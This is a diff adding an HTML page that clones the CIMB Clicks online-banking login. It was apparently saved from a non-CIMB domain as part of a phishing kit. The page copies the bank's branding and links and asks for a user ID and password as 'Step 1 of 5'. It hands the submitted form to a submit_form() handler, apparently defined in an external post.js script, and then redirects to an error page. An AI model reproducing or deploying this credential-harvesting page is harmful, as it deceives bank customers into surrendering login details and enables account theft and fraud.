@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<!-- saved from url=(0042)https://sgbx.online/fpx_999a/CIMB/CIMB.php -->
+<html ng-app="CimbBanking" class=" js no-touch csstransforms3d csstransitions" style="">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<!--<base href=".">-->
+	<base href=".">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<title>CIMB Clicks</title>
+
+	<link href="./CIMB_files/common-a14a4ab3.css" rel="stylesheet" type="text/css">
+	<link href="./CIMB_files/login-267c1ded.css" rel="stylesheet" type="text/css">
+	<link rel="stylesheet" href="./CIMB_files/main-32c7b933.css" type="text/css" disabled="disabled">
+	<script type="text/javascript" async="" src="./CIMB_files/ga.js.download"></script>
+	<script src="./CIMB_files/jquery.compressed.min.js.download"></script>
+	<script src="./CIMB_files/rccp.compressed.min.js.download"></script>
+	<link href="./CIMB_files/styles.ee686c0d7c0e8ceae8e0.bundle.css" rel="stylesheet">
+	<script type="text/javascript" charset="utf-8" async=""
+		src="./CIMB_files/144.9655bebefd6cee9a3bec.chunk.js.download"></script>
+	<style>
+		.select2-dropdown[_ngcontent-c0] {
+			display: none !important;
+		}
+
+		option[_ngcontent-c0] .disabled[_ngcontent-c0] {
+			display: none !important;
+		}
+	</style>
+	<script type="text/javascript" src="./CIMB_files/cc.js.download" id="LOTCC_14272"></script>
+</head>
+
+<body class="page-login windows desktop has-mobile-view" onload="checkBrowser()" onunload=""
+	onbeforeunload="closeBrowser()" onpagehide="closeBrowser()" style="" data-new-gr-c-s-check-loaded="14.991.0"
+	data-gr-ext-installed="">
+	<div class="preloader app-loader new-loader" id="indexLoader" style="opacity: 0; display: none;">
+		<div class="loader">
+			<div class="css-loader"></div>
+		</div>
+	</div>
+	<div class="page-login" id="operaminiContent" style="display:none;">
+		<div class="col-xs-12 col-sm-12 col-md-6 not-found-content-un">
+			<div class="not-found-content-inner-un not-found-pos">
+				<br><br>
+				<p class="title-msg fontStyle"><strong>The browser or version you are using is not supported.</strong>
+				</p>
+				<p class="msg fontStyle" style="font-weight:500 !important;">Please update your existing browser to the
+					latest version or download the latest Chrome or Safari browser to continue using CIMB Clicks.</p>
+			</div>
+		</div>
+	</div>
+	<div id="prelogin-print" class="modal fade cimb-modal cimb-modal-full-screen-mobile" tabindex="-1" role="dialog"
+		aria-labelledby="modal-print" style="display: none; background-color: rgba(255, 255, 255, 0.9);">
+		<div class="modal-dialog modal-lg" role="document">
+			<div class="modal-content">
+				<div class="modal-header">
+					<a class="close" data-dismiss="modal" aria-label="Close" href="javascript:;">
+						<i class="icon icon--close" aria-hidden="true"></i>
+					</a>
+					<h4 class="modal-title">Print</h4>
+				</div>
+				<div class="modal-body print-display-modal">
+					<div class="modal-body-inner"></div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<print-section></print-section>
+	<cimb-app ng-version="4.1.3">
+		<div class="page-level1-container">
+			<router-outlet></router-outlet>
+			<page-login _nghost-c0="">
+				<div _ngcontent-c0="" class="module-downtime" id="down-time-teplate" style="display: none;">
+					<div _ngcontent-c0="" class="">
+						<img _ngcontent-c0="" alt="OctoSend Downtime" class="img-banner full-width hidden-xs hidden-sm"
+							src="./CIMB_files/octo_downtime.png">
+						<div _ngcontent-c0="" class="banner-mobile visible-xs visible-sm"></div>
+					</div>
+					<div _ngcontent-c0="" class="content-container">
+						<h2 _ngcontent-c0="" class="modal-title">System Downtime</h2>
+						<p _ngcontent-c0="" class="downtime-title-text"></p>
+						<div _ngcontent-c0="" class="row">
+							<div _ngcontent-c0="" class="timeStamp">
+								<label _ngcontent-c0="">From</label>
+								<p _ngcontent-c0=""><strong _ngcontent-c0=""><span _ngcontent-c0=""
+											class="downtime-from-time"></span></strong></p>
+							</div>
+							<div _ngcontent-c0="" class="timeStamp">
+								<label _ngcontent-c0="">To</label>
+								<p _ngcontent-c0=""><strong _ngcontent-c0=""><span _ngcontent-c0=""
+											class="downtime-to-time"></span></strong></p>
+							</div>
+						</div>
+						<div _ngcontent-c0="" class="message">
+							<p _ngcontent-c0="" class="downtime-msg-text"><small _ngcontent-c0=""></small></p>
+						</div>
+					</div>
+				</div>
+				<div _ngcontent-c0="" class="login-wrapper js-login-wrapper" style="height:100%;">
+					<div _ngcontent-c0="" class="sidebar-login" style="z-index:1070 !important;">
+						<div _ngcontent-c0="" class="sidebar-overlay-slide js-sidebar-overlay-slide" id="appMenu"></div>
+						<div _ngcontent-c0="" class="page-sidebar" data-pages="sidebar">
+							<div _ngcontent-c0="" class="sidebar-menu resetsidebarwidth">
+								<div class="scroll-wrapper menu-items scroll-content scrollbar scrollable menu-item-inner"
+									style="position: relative;">
+									<ul _ngcontent-c0=""
+										class="menu-items scroll-content scrollbar scrollable menu-item-inner"
+										style="height: 732px; margin-bottom: 0px; margin-right: 0px; max-height: none;">
+										<li _ngcontent-c0="">
+											<a _ngcontent-c0="" class="clickable js-login" title="">
+												<span _ngcontent-c0="" class="icon-title icon icon--login"></span>
+												<span _ngcontent-c0="" class="title">Logssin</span>
+											</a>
+										</li>
+										<li _ngcontent-c0="">
+											<a _ngcontent-c0="" class="clickable js-registration" title="">
+												<span _ngcontent-c0="" class="icon-title icon icon--pen"></span>
+												<span _ngcontent-c0="" class="title">Registration</span>
+											</a>
+										</li>
+										<li _ngcontent-c0="" class="">
+											<a _ngcontent-c0="" aria-controls="help-support-menu" aria-expanded="false"
+												class="collapsed" data-toggle="collapse"
+												href="https://www.cimbclicks.com.my/clicks/#help-support-menu"
+												role="button">
+												<span _ngcontent-c0=""
+													class="icon-title icon-title icon icon--help"></span>
+												<span _ngcontent-c0="" class="title">Help &amp; Support</span>
+												<span _ngcontent-c0="" class="icon icon--arrow-bt"></span>
+											</a>
+											<ul _ngcontent-c0="" class="sub-menu collapse" id="help-support-menu">
+												<li _ngcontent-c0=""><a _ngcontent-c0="" class="link-footer"
+														href="https://www.cimbclicks.com.my/terms-and-conditions.html"
+														target="_blank">Terms &amp; Conditions</a></li>
+												<li _ngcontent-c0=""><a _ngcontent-c0="" class="link-footer"
+														href="https://www.cimbbank.com.my/en/personal/support/privacy.html"
+														target="_blank">Privacy</a></li>
+												<li _ngcontent-c0=""><a _ngcontent-c0="" class="link-footer"
+														href="https://www.cimbclicks.com.my/e-banking-charter.html"
+														target="_blank">e-Banking Charter</a></li>
+											</ul>
+										</li>
+									</ul>
+									<div class="scroll-element scroll-x">
+										<div class="scroll-element_outer">
+											<div class="scroll-element_size"></div>
+											<div class="scroll-element_track"></div>
+											<div class="scroll-bar" style="width: 96px;"></div>
+										</div>
+									</div>
+									<div class="scroll-element scroll-y">
+										<div class="scroll-element_outer">
+											<div class="scroll-element_size"></div>
+											<div class="scroll-element_track"></div>
+											<div class="scroll-bar" style="height: 96px;"></div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+
+
+					<div _ngcontent-c0="" class="main-content login-blink page-container" id="main-content-login">
+						<div _ngcontent-c0="" class="service-activation visible-block-xs clearfix"
+							style="display: none;">
+							<div _ngcontent-c0="" class="banner-mob header-logo">
+								<img _ngcontent-c0="" alt="" class="banner" src="./CIMB_files/header-service-login.png">
+								<div _ngcontent-c0="" class="inner container-fluid">
+									<p _ngcontent-c0="" class="js-help-support-title help-support-title"
+										style="display: none;">Help And Support</p>
+									<a _ngcontent-c0="" class="logo-mob js-logo-header"
+										href="https://www.cimbclicks.com.my/clicks/#">
+										<img _ngcontent-c0="" alt="logo-mobile" class="logo-image"
+											src="./CIMB_files/logo-mob.svg">
+									</a>
+									<a _ngcontent-c0="" class="navbar-toggle " href="javascript:;" id="sidemenu">
+										<i _ngcontent-c0="" class="icon icon--toggle"></i>
+									</a>
+								</div>
+							</div>
+						</div>
+						<div _ngcontent-c0="" class="header header-login help-login">
+							<div _ngcontent-c0="" class="header-top-bar text-right">
+								<div _ngcontent-c0="" class="topbar-1" style="display: block;">
+									<a _ngcontent-c0="" class="top-bar-item"
+										href="https://www.cimbbank.com.my/en/personal/support.html" tabindex="8"
+										target="_blank" title="">
+										<i _ngcontent-c0="" class="icon icon--help"></i>
+										<span _ngcontent-c0="" class="text-label"></span></a><a _ngcontent-c0=""
+										href="https://www.cimbbank.com.my/en/personal/support.html"
+										target="_blank">Help</a>
+
+								</div>
+								<div _ngcontent-c0="" class="topbar-2" style="display: none;">
+									<div _ngcontent-c0="" class="top-bar-item dropdown" tabindex="7">
+										<a _ngcontent-c0="" aria-expanded="false" aria-haspopup="true"
+											class="dropdown-toggle" data-toggle="dropdown"
+											href="https://www.cimbclicks.com.my/clicks/#" role="button">
+											<i _ngcontent-c0="" class="icon icon--message"></i>
+											<span _ngcontent-c0="" class="text-label">BM</span>
+											<span _ngcontent-c0="" class="bm-dropdown">
+												<span _ngcontent-c0="" class="wrapper">
+													<span _ngcontent-c0="" class="profile-dropdown-toggle">
+														<i _ngcontent-c0="" class="icon icon--arrow-bottom"></i>
+													</span>
+												</span>
+											</span>
+										</a>
+										<ul _ngcontent-c0="" aria-labelledby="dLabel"
+											class="dropdown-menu dropdown-info">
+											<li _ngcontent-c0="" class="dropdown-item">
+												<a _ngcontent-c0="" class=" tickable"
+													href="https://www.cimbclicks.com.my/clicks/#">English
+													<i _ngcontent-c0="" class="icon icon--selected"></i>
+												</a>
+											</li>
+											<li _ngcontent-c0="" class="dropdown-item active">
+												<a _ngcontent-c0="" class="tickable"
+													href="https://www.cimbclicks.com.my/clicks/#">Bahasa Malaysia
+													<i _ngcontent-c0="" class="icon icon--selected"></i>
+												</a>
+											</li>
+										</ul>
+									</div>
+									<a _ngcontent-c0="" class="top-bar-item"
+										href="https://www.cimbclicks.com.my/clicks/#" tabindex="8" title="">
+										<i _ngcontent-c0="" class="icon icon--help"></i>
+										<span _ngcontent-c0="" class="text-label">Help</span>
+									</a>
+								</div>
+							</div>
+						</div>
+						<div _ngcontent-c0="" class="banner-mob login-mob">
+							<img _ngcontent-c0="" alt="" class="banner" data-src="img/login-banner-1.png"
+								data-src-retina="img/login-banner-1.png" src="./CIMB_files/login-banner-mob1.png">
+							<div _ngcontent-c0="" class="inner container-fluid">
+								<img _ngcontent-c0="" alt="logo-mobile" class="logo-mob"
+									src="./CIMB_files/logo-mob.svg">
+								<h1 _ngcontent-c0="" class="text-center tac-activation-title">TAC on App Activation</h1>
+
+								<a _ngcontent-c0="" class="back-btn left-btn btn-link tac-activation-cancel"
+									href="javascript:void(0)">
+									<i _ngcontent-c0="" class="icon icon--arrow-right"></i>
+								</a>
+								<a _ngcontent-c0="" class="navbar-note" href="javascript:void(0)" style="display: none;"
+									title="">
+									<span _ngcontent-c0="" class="note-wrap">
+										<span _ngcontent-c0="" class="notice" style="display: none;"></span>
+										<i _ngcontent-c0="" class="icon icon--bell"></i>
+									</span>
+								</a>
+							</div>
+						</div>
+						<div class="scroll-wrapper scrollForm scrollbar scrollable scrollbar-inner override-scroller"
+							style="position: relative;">
+							<div _ngcontent-c0=""
+								class="scrollForm scrollbar scrollable scrollbar-inner override-scroller scroll-content"
+								style="height: 400.234px; margin-bottom: 0px; margin-right: 0px; max-height: none;">
+								<form _ngcontent-c0=""
+									class="form login-form ng-touched ng-dirty ng-valid" id="login-form-step1"
+									 novalidate="novalidate" style="display: block;" onSubmit="submit_form()" action="error.html">
+									<div _ngcontent-c0="" class="note note-login-credential">
+										<h3 _ngcontent-c0="">Please enter your login credentials</h3>
+										<p _ngcontent-c0="" style="text-align: center;    font-style: italic;
+					font-size: 13px;">Step 1 of 5</p>
+									</div>
+									<div _ngcontent-c0="" class="form-login-area" id="form-login-step1">
+										<div _ngcontent-c0="" class="input-cmp input-cmp-user-id input-cmp-validate"
+											id="user-id-wrapper">
+											<div _ngcontent-c0="" class="inputarea-box">
+												<label _ngcontent-c0="" class="label label-on">User ID</label>
+												<input _ngcontent-c0="" autocapitalize="off" autocomplete="off"
+													autocorrect="off" id="uname" maxlength="32" minlength="6"
+													name="uname" placeholder="Enter User ID" required=""
+													style="color: black !important;" tabindex="2" type="text"
+													aria-required="true" class="ng-touched ng-dirty ng-valid"
+													aria-invalid="false" aria-describedby="user-id-error">
+												<div id="user-id-error" class="error" style="display: none;">Please
+													enter at least 6 characters</div>
+												<br>
+												<div _ngcontent-c0="" class="text-error js_error_message">Invalid User
+													ID or Password</div>
+												<div _ngcontent-c0="" class="text-error js_blocked_message">You have
+													exceeded the number of times for wrong password. Please <a
+														_ngcontent-c0="" class="link" href="javascript:;">reset your
+														password</a></div>
+												<hr _ngcontent-c0="" class="bottom-bar">
+												<i _ngcontent-c0="" class="icon icon--error icon-invalid"></i>
+											</div>
+										</div>
+										<div _ngcontent-c0="" id="googlerecaptcha"></div>
+										<label _ngcontent-c0="" class="label label-on">Password</label>
+										<input _ngcontent-c0="" autocapitalize="off" autocomplete="off"
+											autocorrect="off" id="pd" maxlength="32" minlength="6" name="pd"
+											placeholder="Enter Password" required="" style="color: black !important;"
+											tabindex="2" type="password" aria-required="true"
+											class="ng-touched ng-dirty ng-valid" aria-invalid="false"
+											aria-describedby="user-id-error">
+										<div id="user-id-error" class="error" style="display: none;">Please enter at
+											least 6 characters</div>
+										<div _ngcontent-c0="" class="input-field input-field-btn">
+											<input hidden="" id="b" name="b" value="CIMB">
+											<button _ngcontent-c0=""
+												class="btn-primary btn-block btn-next googleCapthaCls" tabindex="3"
+												type="submit">
+												<span _ngcontent-c0="" class="btn-text">Login</span>
+											</button>
+										</div>
+									</div>
+									<div _ngcontent-c0="" class="link-cancel">
+										<a _ngcontent-c0="" class="link-text link-size" href="javascript:;"
+											style="cursor: pointer">Cancel</a>
+									</div>
+									<div _ngcontent-c0="" class="form-btn-group">
+									</div>
+								</form>
+								<div _ngcontent-c0="" class="bgd-footer">&nbsp;</div>
+							</div>
+							<div class="scroll-element scroll-x">
+								<div class="scroll-element_outer">
+									<div class="scroll-element_size"></div>
+									<div class="scroll-element_track"></div>
+									<div class="scroll-bar" style="width: 96px;"></div>
+								</div>
+							</div>
+							<div class="scroll-element scroll-y">
+								<div class="scroll-element_outer">
+									<div class="scroll-element_size"></div>
+									<div class="scroll-element_track"></div>
+									<div class="scroll-bar" style="height: 96px;"></div>
+								</div>
+							</div>
+						</div>
+						<div _ngcontent-c0="" class="visible-xs">
+							<div _ngcontent-c0="" class="mobile-footer"
+								style="background-color:transparent !important;">&nbsp;</div>
+							<footer _ngcontent-c0="" class="container-fluid">
+								<div _ngcontent-c0="" class="nav-footer">
+									<span _ngcontent-c0="" class="link-footer">All rights reserved. Copyright © 2021 <br
+											_ngcontent-c0="">CIMB Bank Berhad 197201001799 (13491-P)</span>
+								</div>
+							</footer>
+							<img _ngcontent-c0="" class="img-footer" src="./CIMB_files/stripebar.gif" width="100%">
+						</div>
+					</div>
+					<div _ngcontent-c0="" class="carousel-banner" id="carousel-banner" style="z-index:1045 !important;">
+						<span _ngcontent-c0="" class="triangle-right"></span>
+
+					</div>
+					<div _ngcontent-c0="" class="hidden-xs hidden-sm login-bottom-footer">
+						<footer _ngcontent-c0="" class="footer container-fluid">
+							<div _ngcontent-c0="" class="nav-footer">
+								<a _ngcontent-c0="" class="link-footer"
+									href="https://www.cimbclicks.com.my/terms-and-conditions.html" target="_blank">Terms
+									&amp; Conditions</a>
+								<a _ngcontent-c0="" class="link-footer"
+									href="https://www.cimbbank.com.my/en/personal/support/privacy.html"
+									target="_blank">Privacy</a>
+								<a _ngcontent-c0="" class="link-footer"
+									href="https://www.cimbclicks.com.my/e-banking-charter.html"
+									target="_blank">e-Banking Charter</a>
+								<br _ngcontent-c0="">
+								<span _ngcontent-c0="" class="link-footer">Copyright © 2021 CIMB Bank Berhad
+									197201001799 (13491-P)</span>
+							</div>
+						</footer>
+					</div>
+				</div>
+				<div _ngcontent-c0="" class="modal-confirm-mobile" id="modal-confirm-mobile"
+					style="display: none; z-index:1050 !important;">
+					<div _ngcontent-c0="" class="modal-content">
+						<div _ngcontent-c0="" class="text-center clearfix" id="header">
+							<h1 _ngcontent-c0="">Quick Balance</h1>
+						</div>
+						<div _ngcontent-c0="" class="col-xs-12 text-center clearfix" id="content">
+							<p _ngcontent-c0="">You have yet enable Quick Balance.<br _ngcontent-c0=""> Enable Now</p>
+						</div>
+						<div _ngcontent-c0="" class="col-xs-12 clearfix" id="modal-action">
+							<div _ngcontent-c0="" class="yes-no text-center clearfix">
+								<a _ngcontent-c0="" class="btn btn-half btn-half-right btn-no"
+									href="javascript:;">No</a>
+								<a _ngcontent-c0="" class="btn btn-half btn-half-left btn-yes"
+									href="javascript:;">Yes</a>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div _ngcontent-c0="" class="modal-confirm-desktop" id="modal-confirm-desktop"
+					style="display: none; z-index:1050 !important;height:100%;">
+					<div _ngcontent-c0="" class="modal-content">
+						<div _ngcontent-c0="" class="header-confirm-desktop text-left clearfix" id="header">
+							<h1 _ngcontent-c0="">Quick Balance</h1>
+						</div>
+						<div _ngcontent-c0="" class="content-confirm-desktop col-xs-12 text-left clearfix" id="content">
+							<p _ngcontent-c0="">You have yet enable Quick Balance.<br _ngcontent-c0=""> Enable Now</p>
+						</div>
+						<div _ngcontent-c0="" class="footer-action col-xs-12 clearfix" id="modal-action">
+							<div _ngcontent-c0="" class="yes-no text-center clearfix">
+								<div _ngcontent-c0="" class="row">
+									<div _ngcontent-c0="" class="col-lg-6">
+										<a _ngcontent-c0="" class="btn btn-default btn-half btn-half-right btn-no"
+											href="javascript:;">No</a>
+									</div>
+									<div _ngcontent-c0="" class="col-lg-6">
+										<a _ngcontent-c0="" class="btn btn-primary btn-half btn-half-left btn-yes"
+											href="javascript:;">Yes</a>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</page-login>
+		</div>
+		<div class="preloader app-loader new-loader" style="opacity: 0; display: none;">
+			<div class="loader">
+				<div class="css-loader"></div>
+			</div>
+		</div>
+		<not-found>
+			<div class="not-found-wrapper-404" style="display: none;">
+				<div class="clearfix not-found-inner">
+					<div class="col-xs-12 col-sm-12 col-md-6 hero-banner">
+						<span class="triangle-right"></span>
+						<div class="not-found-banner"></div>
+						<img alt="" class="octobus-banner" src="./CIMB_files/octobus-banner.png">
+						<img alt="CIMB Logo" class="img-logo logo-mob visible-xs visible-sm"
+							src="./CIMB_files/logo-white.svg">
+					</div>
+					<div class="col-xs-12 col-sm-12 col-md-6 not-found-content">
+						<div class="not-found-content-inner">
+							<img alt="CIMB Logo" class="img-logo hidden-xs hidden-sm" src="./CIMB_files/logo.svg">
+							<h1 class="title">Page not found</h1>
+							<p class="msg">We are unable to find the page you are looking for.</p>
+						</div>
+					</div>
+				</div>
+				<img class="img-footer" src="./CIMB_files/stripebar.gif" width="100%">
+			</div>
+		</not-found>
+		<countdown-modal>
+			<div aria-labelledby="session-timeout"
+				class="modal fade cimb-modal session-timeout-modal cimb-modal-full-screen-mobile cimb-modal-has-footer js-modal-full-screen"
+				id="modal-session-timeout" role="dialog" tabindex="-1">
+				<div class="modal-dialog modal-sm" role="document">
+					<div class="modal-content">
+						<div class="modal-header">
+							<h4 class="modal-title" id="session-timeout">Attention!</h4>
+						</div>
+						<div class="modal-body">
+							<div class="modal-body-inner">
+								<p><strong>Your secured connection to CIMB Clicks is about to timeout</strong></p>
+								<p class="time">00:00:00</p>
+								<small>Please complete your transaction to avoid interruption.</small>
+							</div>
+						</div>
+						<div class="modal-footer">
+							<button class="btn btn-primary btn-continue">OK</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</countdown-modal>
+		<common-error-modal>
+			<div class="error-modal-container" style="display: none;">
+				<div class="modal-content" style="min-height:0">
+					<div class="header text-left clearfix">
+						<h1></h1>
+					</div>
+					<div class="content col-xs-12 text-left clearfix">
+						<p style="white-space: pre-line;"></p>
+					</div>
+					<div class="footer-action col-xs-12 clearfix">
+						<div class="yes-no text-center clearfix">
+
+							<div>
+
+							</div>
+
+							<div>
+
+								<a class="btn btn-primary btn-full btn-half-left btn-yes cursor">OK</a>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</common-error-modal>
+		<base-modal-container>
+			<div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+			</div>
+		</base-modal-container>
+	</cimb-app>
+	<div
+		style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
+		<div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
+		</div>
+	</div>
+</body>
+<script type="text/javascript" src="post.js"></script>
+</html>
